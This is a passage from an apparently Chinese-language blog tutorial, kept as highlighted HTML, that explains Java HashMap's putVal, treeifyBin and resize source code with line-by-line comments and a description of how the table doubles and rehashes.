class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    1）transient Node&lt;K,V&gt;[] table; 表示存储Map集合中元素的数组。</span></span><br><span class="line"><span class="comment">    2）(tab = table) == null 表示将空的table赋值给tab,然后判断tab是否等于null，第一次肯定是null</span></span><br><span class="line"><span class="comment">    3）(n = tab.length) == 0 表示将数组的长度0赋值给n,然后判断n是否等于0，n等于0</span></span><br><span class="line"><span class="comment">    由于if判断使用双或，满足一个即可，则执行代码 n = (tab = resize()).length; 进行数组初始化。</span></span><br><span class="line"><span class="comment">    并将初始化好的数组长度赋值给n.</span></span><br><span class="line"><span class="comment">    4）执行完n = (tab = resize()).length，数组tab每个空间都是null</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    1）i = (n - 1) &amp; hash 表示计算数组的索引赋值给i，即确定元素存放在哪个桶中</span></span><br><span class="line"><span class="comment">    2）p = tab[i = (n - 1) &amp; hash]表示获取计算出的位置的数据赋值给节点p</span></span><br><span class="line"><span class="comment">    3) (p = tab[i = (n - 1) &amp; hash]) == null 判断节点位置是否等于null，如果为null，则执行代码：tab[i] = newNode(hash, key, value, null);根据键值对创建新的节点放入该位置的桶中</span></span><br><span class="line"><span class="comment">        小结：如果当前桶没有哈希碰撞冲突，则直接把键值对插入空间位置</span></span><br><span class="line"><span class="comment">    */</span> </span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)</span><br><span class="line">        <span class="comment">//创建一个新的节点存入到桶中</span></span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="comment">// 执行else说明tab[i]不等于null，表示这个位置已经有值了。</span></span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        比较桶中第一个元素(数组中的结点)的hash值和key是否相等</span></span><br><span class="line"><span class="comment">        1）p.hash == hash ：p.hash表示原来存在数据的hash值  hash表示后添加数据的hash值 比较两个 hash值是否相等</span></span><br><span class="line"><span class="comment">                 说明：p表示tab[i]，即 newNode(hash, key, value, null)方法返回的Node对象。</span></span><br><span class="line"><span class="comment">                    Node&lt;K,V&gt; newNode(int hash, K key, V value, Node&lt;K,V&gt; next) </span></span><br><span class="line"><span class="comment">                    &#123;</span></span><br><span class="line"><span class="comment">                        return new Node&lt;&gt;(hash, key, value, next);</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                    而在Node类中具有成员变量hash用来记录着之前数据的hash值的</span></span><br><span class="line"><span class="comment">             2）(k = p.key) == key ：p.key获取原来数据的key赋值给k  key 表示后添加数据的key 比较两个key的地址值是否相等</span></span><br><span class="line"><span class="comment">             3）key != null &amp;&amp; key.equals(k)：能够执行到这里说明两个key的地址值不相等，那么先判断后添加的key是否等于null，如果不等于null再调用equals方法判断两个key的内容是否相等</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                说明：两个元素哈希值相等，并且key的值也相等</span></span><br><span class="line"><span class="comment">                将旧的元素整体对象赋值给e，用e来记录</span></span><br><span class="line"><span class="comment">                */</span> </span><br><span class="line">                e = p;</span><br><span class="line">        <span class="comment">// hash值不相等或者key不相等；判断p是否为红黑树结点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            <span class="comment">// 放入树中</span></span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="comment">// 说明是链表节点</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            1)如果是链表的话需要遍历到最后节点然后插入</span></span><br><span class="line"><span class="comment">            2)采用循环遍历的方式，判断链表中是否有重复的key</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                1)e = p.next 获取p的下一个元素赋值给e</span></span><br><span class="line"><span class="comment">                2)(e = p.next) == null 判断p.next是否等于null，等于null，说明p没有下一个元素，那么此时到达了链表的尾部，还没有找到重复的key,则说明HashMap没有包含该键</span></span><br><span class="line"><span class="comment">                将该键值对插入链表中</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    1）创建一个新的节点插入到尾部</span></span><br><span class="line"><span class="comment">                     p.next = newNode(hash, key, value, null);</span></span><br><span class="line"><span class="comment">                     Node&lt;K,V&gt; newNode(int hash, K key, V value, Node&lt;K,V&gt; next) </span></span><br><span class="line"><span class="comment">                     &#123;</span></span><br><span class="line"><span class="comment">                                return new Node&lt;&gt;(hash, key, value, next);</span></span><br><span class="line"><span class="comment">                         &#125;</span></span><br><span class="line"><span class="comment">                         注意第四个参数next是null，因为当前元素插入到链表末尾了，那么下一个节点肯定是null</span></span><br><span class="line"><span class="comment">                         2）这种添加方式也满足链表数据结构的特点，每次向后添加新的元素</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                    p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    1)节点添加完成之后判断此时节点个数是否大于TREEIFY_THRESHOLD临界值8，如果大于</span></span><br><span class="line"><span class="comment">                    则将链表转换为红黑树</span></span><br><span class="line"><span class="comment">                    2）int binCount = 0 ：表示for循环的初始化值。从0开始计数。记录着遍历节点的个数。值是0表示第一个节点，1表示第二个节点。。。。7表示第八个节点，加上数组中的的一个元素，元素个数是9</span></span><br><span class="line"><span class="comment">                    TREEIFY_THRESHOLD - 1 --》8 - 1 ---》7</span></span><br><span class="line"><span class="comment">                    如果binCount的值是7(加上数组中的的一个元素，元素个数是9)</span></span><br><span class="line"><span class="comment">                    TREEIFY_THRESHOLD - 1也是7，此时转换红黑树</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                        <span class="comment">//转换为红黑树</span></span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    <span class="comment">// 跳出循环</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                 </span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                执行到这里说明e = p.next 不是null，不是最后一个元素。继续判断链表中结点的key值与插  入的元素的key值是否相等</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="comment">// 相等，跳出循环</span></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                要添加的元素和链表中的存在的元素的key相等了，则跳出for循环。不用再继续比较了</span></span><br><span class="line"><span class="comment">                直接执行下面的if语句去替换去 if (e != null) </span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                说明新添加的元素和当前节点不相等，继续查找下一个节点。</span></span><br><span class="line"><span class="comment">                用于遍历桶中的链表，与前面的e = p.next组合，可以遍历链表</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        表示在桶中找到key值、hash值与插入元素相等的结点</span></span><br><span class="line"><span class="comment">        也就是说通过上面的操作找到了重复的键，所以这里就是把该键的值变为新的值，并返回旧值</span></span><br><span class="line"><span class="comment">        这里完成了put方法的修改功能</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123; </span><br><span class="line">            <span class="comment">// 记录e的value</span></span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            <span class="comment">// onlyIfAbsent为false或者旧值为null</span></span><br><span class="line">            <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)</span><br><span class="line">                <span class="comment">//用新值替换旧值</span></span><br><span class="line">                <span class="comment">//e.value 表示旧值  value表示新值 </span></span><br><span class="line">                e.value = value;</span><br><span class="line">            <span class="comment">// 访问后回调</span></span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            <span class="comment">// 返回旧值</span></span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//修改记录次数</span></span><br><span class="line">    ++modCount;</span><br><span class="line">    <span class="comment">// 判断实际大小是否大于threshold阈值，如果超过则扩容</span></span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    <span class="comment">// 插入后回调</span></span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="将链表转换为红黑树的treeifyBin方法"><a href="#将链表转换为红黑树的treeifyBin方法" class="headerlink" title="将链表转换为红黑树的treeifyBin方法"></a>将链表转换为红黑树的treeifyBin方法</h4><p>节点添加完成之后判断此时节点个数是否大于TREEIFY_THRESHOLD临界值8，如果大于则将链表转换为红黑树，转换红黑树的方法  treeifyBin，整体代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">   <span class="comment">//转换为红黑树 tab表示数组名  hash表示哈希值</span></span><br><span class="line">   treeifyBin(tab, hash);</span><br></pre></td></tr></table></figure><p>treeifyBin方法如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Replaces all linked nodes in bin at index for given hash unless</span></span><br><span class="line"><span class="comment"> * table is too small, in which case resizes instead.</span></span><br><span class="line"><span class="comment">   替换指定哈希表的索引处桶中的所有链接节点，除非表太小，否则将修改大小。</span></span><br><span class="line"><span class="comment">   Node&lt;K,V&gt;[] tab = tab 数组名</span></span><br><span class="line"><span class="comment">   int hash = hash表示哈希值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">treeifyBin</span><span class="params">(Node&lt;K,V&gt;[] tab, <span class="keyword">int</span> hash)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> n, index; Node&lt;K,V&gt; e;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      如果当前数组为空或者数组的长度小于进行树形化的阈值(MIN_TREEIFY_CAPACITY = 64),</span></span><br><span class="line"><span class="comment">      就去扩容。而不是将节点变为红黑树。</span></span><br><span class="line"><span class="comment">      目的：如果数组很小，那么转换红黑树，然后遍历效率要低一些。这时进行扩容，那么重新计算哈希值</span></span><br><span class="line"><span class="comment">      ，链表长度有可能就变短了，数据会放到数组中，这样相对来说效率高一些。</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">if</span> (tab == <span class="keyword">null</span> || (n = tab.length) &lt; MIN_TREEIFY_CAPACITY)</span><br><span class="line">          <span class="comment">//扩容方法</span></span><br><span class="line">          resize();</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ((e = tab[index = (n - <span class="number">1</span>) &amp; hash]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">          1）执行到这里说明哈希表中的数组长度大于阈值64，开始进行树形化</span></span><br><span class="line"><span class="comment">          2）e = tab[index = (n - 1) &amp; hash]表示将数组中的元素取出赋值给e,e是哈希表中指定位置桶里的链表节点，从第一个开始</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line">          <span class="comment">//hd：红黑树的头结点   tl :红黑树的尾结点</span></span><br><span class="line">          TreeNode&lt;K,V&gt; hd = <span class="keyword">null</span>, tl = <span class="keyword">null</span>;</span><br><span class="line">          <span class="keyword">do</span> &#123;</span><br><span class="line">              <span class="comment">//新创建一个树的节点，内容和当前链表节点e一致</span></span><br><span class="line">              TreeNode&lt;K,V&gt; p = replacementTreeNode(e, <span class="keyword">null</span>);</span><br><span class="line">              <span class="keyword">if</span> (tl == <span class="keyword">null</span>)</span><br><span class="line">                  <span class="comment">//将新创键的p节点赋值给红黑树的头结点</span></span><br><span class="line">                  hd = p;</span><br><span class="line">              <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="comment">/*</span></span><br><span class="line"><span class="comment">                   p.prev = tl：将上一个节点p赋值给现在的p的前一个节点</span></span><br><span class="line"><span class="comment">                   tl.next = p;将现在节点p作为树的尾结点的下一个节点</span></span><br><span class="line"><span class="comment">                  */</span></span><br><span class="line">                  p.prev = tl;</span><br><span class="line">                  tl.next = p;</span><br><span class="line">              &#125;</span><br><span class="line">              tl = p;</span><br><span class="line">              <span class="comment">/*</span></span><br><span class="line"><span class="comment">              e = e.next 将当前节点的下一个节点赋值给e,如果下一个节点不等于null</span></span><br><span class="line"><span class="comment">              则回到上面继续取出链表中节点转换为红黑树</span></span><br><span class="line"><span class="comment">              */</span></span><br><span class="line">          &#125; <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>);</span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">          让桶中的第一个元素即数组中的元素指向新建的红黑树的节点，以后这个桶里的元素就是红黑树</span></span><br><span class="line"><span class="comment">          而不是链表数据结构了</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line">          <span class="keyword">if</span> ((tab[index] = hd) != <span class="keyword">null</span>)</span><br><span class="line">              <span class="comment">//左旋右旋操作</span></span><br><span class="line">              hd.treeify(tab);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>小结：上述操作一共做了如下几件事：</p><p>1.根据哈希表中元素个数确定是扩容还是树形化</p><p>2.如果是树形化遍历桶中的元素，创建相同个数的树形节点，复制内容，建立起联系</p><p>3.然后让桶中的第一个元素指向新创建的树根节点，替换桶的链表内容为树形化内容</p><h4 id="扩容方法-resize"><a href="#扩容方法-resize" class="headerlink" title="扩容方法_resize"></a>扩容方法_resize</h4><h5 id="扩容机制"><a href="#扩容机制" class="headerlink" title="扩容机制"></a>扩容机制</h5><p>想要了解HashMap的扩容机制你要有这两个问题</p><ul><li>1.什么时候才需要扩容</li><li>2.HashMap的扩容是什么</li></ul><p><strong>1.什么时候才需要扩容</strong></p><p>当HashMap中的元素个数超过数组大小(数组长度)*loadFactor(负载因子)时，就会进行数组扩容，loadFactor的默认值(DEFAULT_LOAD_FACTOR)是0.75,这是一个折中的取值。也就是说，默认情况下，数组大小为16，那么当HashMap中的元素个数超过16×0.75=12(这个值就是阈值或者边界值threshold值)的时候，就把数组的大小扩展为2×16=32，即扩大一倍，然后重新计算每个元素在数组中的位置，而这是一个非常耗性能的操作，所以如果我们已经预知HashMap中元素的个数，那么预知元素的个数能够有效的提高HashMap的性能。</p><p><strong>补充：</strong></p><p><strong>当HashMap中的其中一个链表的对象个数如果达到了8个，此时如果数组长度没有达到64，那么HashMap会先扩容解决，如果已经达到了64，那么这个链表会变成红黑树，节点类型由Node变成TreeNode类型。当然，如果映射关系被移除后，下次执行resize方法时判断树的节点个数低于6，也会再把树转换为链表。</strong></p><p><strong>2.HashMap的扩容是什么</strong></p><p> 进行扩容，会伴随着一次重新hash分配，并且会遍历hash表中所有的元素，是非常耗时的。在编写程序中，要尽量避免resize。 </p><p>HashMap在进行扩容时，使用的rehash方式非常巧妙，因为每次扩容都是翻倍，与原来计算的 (n-1)&amp;hash的结果相比，只是多了一个bit位，所以节点要么就在原来的位置，要么就被分配到”<strong>原位置+旧容量</strong>“这个位置。</p><p> 怎么理解呢？例如我们从16扩展为32时，具体的变化如下所示： </p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615094353.png" alt="image-20191117110812839"></p><p> 因此元素在重新计算hash之后，因为n变为2倍，那么n-1的标记范围在高位多1bit(红色)，因此新的index就会发生这样的变化： </p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615094350.png" alt="image-20191117110934974"></p><p>说明：5是假设计算出来的原来的索引。这样就验证了上述所描述的：扩容之后所以节点要么就在原来的位置，要么就被分配到”<strong>原位置+旧容量</strong>“这个位置。</p><p> 因此，我们在扩充HashMap的时候，不需要重新计算hash，只需要看看原来的hash值新增的那个bit是1还是0就可以了，是0的话索引没变，是1的话索引变成“原索引+oldCap(<strong>原位置+旧容量</strong>)”。可以看看下图为16扩充为32的resize示意图： </p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615094346.png" alt="image-20191117111211630"></p><p>正是因为这样巧妙的rehash方式，既省去了重新计算hash值的时间，而且同时，由于新增的1bit是0还是1可以认为是随机的，在resize的过程中保证了rehash之后每个桶上的节点数一定小于等于原来桶上的节点数，保证了rehash之后不会出现更严重的hash冲突，均匀的把之前的冲突的节点分散到新的桶中了。</p><p>我们如何判断<code>hash</code>值多出来的那一位是<code>0</code>还是<code>1</code>呢，很简单，只要用<code>hash</code>值与旧容量做与运算，结果不为<code>0</code>表示多出的这一位是<code>1</code>，否则就是0。比如说，容量为<code>8</code>（二进制<code>1000</code>），扩容后多出来的是第四位，于是让<code>hash</code>值与<code>1000</code>做与运算，若<code>hash</code>值的第四位是<code>1</code>，与<code>1000</code>做与运算后结果就是<code>1000</code>，若第四位是<code>0</code>，与<code>1000</code>做与运算后就是<code>0</code>。</p><h5 id="源码resize方法的解读"><a href="#源码resize方法的解读" class="headerlink" title="源码resize方法的解读"></a>源码resize方法的解读</h5><p>下面是代码的具体实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt;[] resize() &#123;</span><br><span class="line">    <span class="comment">//得到当前数组</span></span><br><span class="line">    Node&lt;K,V&gt;[] oldTab = table;</span><br><span class="line">    <span class="comment">//如果当前数组等于null长度返回0，否则返回当前数组的长度</span></span><br><span class="line">    <span class="keyword">int</span> oldCap = (oldTab == <span class="keyword">null</span>) ? <span class="number">0</span> : oldTab.length;</span><br><span class="line">    <span class="comment">//当前阀值点 默认是12(16*0.75)</span></span><br><span class="line">    <span class="keyword">int</span> oldThr = threshold;</span><br><span class="line">    <span class="keyword">int</span> newCap, newThr = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//如果老的数组长度大于0</span></span><br><span class="line">    <span class="comment">//开始计算扩容后的大小</span></span><br><span class="line">    <span class="keyword">if</span> (oldCap &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 超过最大值就不再扩充了，就只好随你碰撞去吧</span></span><br><span class="line">        <span class="keyword">if</span> (oldCap &gt;= MAXIMUM_CAPACITY) &#123;</span><br><span class="line">            <span class="comment">//修改阈值为int的最大值</span></span><br><span class="line">            threshold = Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">return</span> oldTab;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        没超过最大值，就扩充为原来的2倍</span></span><br><span class="line"><span class="comment">        1)(newCap = oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY 扩大到2倍之后容量要小于最大容量</span></span><br><span class="line"><span class="comment">        2）oldCap &gt;= DEFAULT_INITIAL_CAPACITY 原数组长度大于等于数组初始化长度16</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((newCap = oldCap &lt;&lt; <span class="number">1</span>) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class="line">                 oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class="line">            <span class="comment">//阈值扩大一倍</span></span><br><span class="line">            newThr = oldThr &lt;&lt; <span class="number">1</span>; <span class="comment">// double threshold</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//老阈值点大于0 直接赋值</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (oldThr &gt; <span class="number">0</span>) <span class="comment">// 老阈值赋值给新的数组长度</span></span><br><span class="line">        newCap = oldThr;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">// 直接使用默认值</span></span><br><span class="line">        newCap = DEFAULT_INITIAL_CAPACITY;<span class="comment">//16</span></span><br><span class="line">        newThr = (<span class="keyword">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 计算新的resize最大上限</span></span><br><span class="line">    <span class="keyword">if</span> (newThr == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)newCap * loadFactor;</span><br><span class="line">        newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (<span class="keyword">float</span>)MAXIMUM_CAPACITY ?</span><br><span class="line">                  (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//新的阀值 默认原来是12 乘以2之后变为24</span></span><br><span class="line">    threshold = newThr;</span><br><span class="line">    <span class="comment">//创建新的哈希表</span></span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</span><br><span class="line">    <span class="comment">//newCap是新的数组长度--》32</span></span><br><span class="line">    Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[newCap];</span><br><span class="line">    table = newTab;</span><br><span class="line">    <span class="comment">//判断旧数组是否等于空</span></span><br><span class="line">    <span class="keyword">if</span> (oldTab != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 把每个bucket都移动到新的buckets中</span></span><br><span class="line">        <span class="comment">//遍历旧的哈希表的每个桶，重新计算桶里元素的新位置</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; oldCap; ++j) &#123;</span><br><span class="line">            Node&lt;K,V&gt; e;</span><br><span class="line">            <span class="keyword">if</span> ((e = oldTab[j]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//原来的数据赋值为null 便于GC回收</span></span><br><span class="line">                oldTab[j] = <span class="keyword">null</span>;</span><br><span class="line">                <span class="comment">//判断数组是否有下一个引用</span></span><br><span class="line">                <span class="keyword">if</span> (e.next == <span class="keyword">null</span>)</span><br><span class="line">                    <span class="comment">//没有下一个引用，说明不是链表，当前桶上只有一个键值对，直接插入</span></span><br><span class="line">                    newTab[e.hash &amp; (newCap - <span class="number">1</span>)] = e;</span><br><span class="line">                <span class="comment">//判断是否是红黑树</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (e <span 